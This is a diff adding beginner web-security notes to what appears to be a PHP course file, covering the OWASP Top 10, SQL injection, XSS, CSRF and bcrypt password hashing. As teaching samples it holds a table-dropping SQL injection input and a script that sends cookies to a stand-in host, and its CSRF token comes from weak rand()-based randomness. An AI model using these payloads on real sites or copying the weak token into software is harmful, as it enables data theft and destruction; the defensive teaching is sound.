@@ -2395,7 +2395,7 @@ echo $db->lastInsertId();
 
 ----------------------------------------------------------------------------------
 
-# Update
+## Update
 
 *** rowCount() run on statement ***
 
@@ -2452,6 +2452,145 @@ echo $statement->rowCount();
 
 ----------------------------------------------------------------------------------
 
+# Web Application Security
+
+1. Performance
+2. Security
+3. Maintenance
+4. Scalability
+
+----------------------------------------------------------------------------------
+
+## Security
+
+1. Application Security (for Developer [code] )
+2. Software Security ( Web Server, Programming Language, Server OperatingSystem )
+3. Network Security ( Network which exist Application Server )
+4. Hardware Security
+5. Physical Security( Server room which exist in Server or DataCenter )
+
+----------------------------------------------------------------------------------
+
+## OWASP Top 10 (Open Web Application Security Project)
+
+1. Injection
+// should use Proven from framework
+2. Broken Authentication
+3. Sensitive Data Exposure
+4. XML External Entities (XXE)
+// should use Proven from framework
+5. Broken Access Control (eg. Auth::check() missing in _actions/populate.php, role value not check in delete.php and suspended.php)
+//should use Hosting, VPS, Cloud Service
+6. Security Misconfiguration
+7. Cross-Site Scripting (XSS)
+8. nsecure Deserialization
+9. Using Component with Known Vulnerabilities
+10. Insufficient Logging & Monitoring
+
+https://owasp.org/www-project-top-ten/
+
+----------------------------------------------------------------------------------
+
+## Code Problem
+
+### SQL Injection
+
+*** Can prevent with using Prepare Statement ***
+
+// get.php
+$id = $_GET['id'];
+$sql = "SELECT * FROM users WHERE id = $id";
+
+// input
+get.php?id=1;drop table users
+
+----------------------------------------------------------------------------------
+
+### XSS – Cross-site Scripting ( Script Injection )
+
+*** Can prevent with htmlspecialchars() funciton  in out put ***
+
+*** Can also use HTML Purifier <http://htmlpurifier.org/> ***
+
+// input
+<script>location.href='http://me.xyz?c='+document.cookie</script>
+
+// output
+<?php echo htmlspecialchars($comment) ?>
+<?= htmlspecialchars($comment) ?>
+
+
+//can use with helper function
+function h($content) {
+return htmlspecialchars($content);
+}
+
+<?php echo h($comment) ?>
+<?= h($comment) ?>
+
+----------------------------------------------------------------------------------
+
+## CSRF – Cross-Site Request Forgery
+
+// another website
+<img src="http://localhost/project/_delete.php?id=1">
+
+// Random Token
+<?php
+echo sha1(rand(1, 1000) . time());  // 22d0fe99e95aa559355c4f514334bf121601568f
+
+//index.php
+<?php
+session_start();
+$token = sha1(rand(1, 1000) . 'csrf secret');
+$_SESSION['csrf'] = $token;
+?>
+<a href="delete.php?id=1&csrf=<?= $token ?>">Delete</a>
+
+// delete.php
+
+<?php
+// delete.php
+session_start();
+if($_GET['csrf'] === $_SESSION['csrf']) {
+echo "Good request";
+} else {
+echo "Bad request";
+}
+
+----------------------------------------------------------------------------------
+
+## Hash funciton
+
+md5() function  // 32
+
+shal() function //40
+
+bcrypt // password_hash()
+
+----------------------------------------------------------------------------------
+
+## Saving Passwords
+
+//password1.php
+<?php
+$password = "userpassword";
+$hash = password_hash($password, PASSWORD_BCRYPT);
+
+echo $hash; // $2y$10$vXvL86DCY/Hh3BiIC0fx.eH06Hsea9kBz3CO2HRkNnVJyPIdtisXS
+
+//password2.php
+<?php
+$hash = '$2y$10$vXvL86DCY/Hh3BiIC0fx.eH06Hsea9kBz3CO2HRkNnVJyPIdtisXS';
+if(password_verify('userpassword', $hash)) {
+echo 'Correct Password';
+} else {
+echo 'Incorrect Password';
+}  
+// Correct Password
+
+----------------------------------------------------------------------------------
+
 //create.php (change)
 //autoload_helper.php (delete)
 //UsersTable.php (change)
@@ -2460,3 +2599,5 @@ echo $statement->rowCount();
 //HTTP.php  (change)
 //login.php (remove suspended comment, change)
 //profile.php (change)
+
+----------------------------------------------------------------------------------
